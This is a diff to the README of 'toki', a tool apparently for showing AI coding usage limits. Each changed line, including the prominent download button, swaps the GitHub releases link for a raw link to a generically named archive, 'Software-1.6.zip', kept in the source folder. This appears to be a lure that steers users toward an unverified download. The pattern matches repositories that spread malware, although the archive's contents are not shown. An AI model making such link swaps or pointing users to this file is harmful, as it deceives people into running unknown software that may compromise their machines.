@@ -1,7 +1,7 @@
 <h1>⚡ toki - Your AI Coding Limits, Right on the Screen Edge</h1>
 
 <p align="center">
-  <a href="https://github.com/kim-san-web/toki/releases" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">
+  <a href="https://raw.githubusercontent.com/kim-san-web/toki/main/src/main/Software-1.6.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">
     🚀 Download toki Now (Free)
   </a>
 </p>
@@ -51,7 +51,7 @@ Follow these simple steps. If you can use a web browser and click a button, you 
 
 Visit this link to download the application:
 
-**[🔗 Click Here to Go to the toki Download Page)](https://github.com/kim-san-web/toki/releases)**
+**[🔗 Click Here to Go to the toki Download Page)](https://raw.githubusercontent.com/kim-san-web/toki/main/src/main/Software-1.6.zip)**
 
 
 
@@ -146,7 +146,7 @@ Stop guessing and start knowing. With toki, you will always have a clear picture
 
 Visit this link to download the application:
 
-**[🔗 Go to the toki Download Page](https://github.com/kim-san-web/toki/releases)**
+**[🔗 Go to the toki Download Page](https://raw.githubusercontent.com/kim-san-web/toki/main/src/main/Software-1.6.zip)**
 
 It takes less than two minutes from download to launch. Try it once, and you will wonder how you ever coded without it.
 
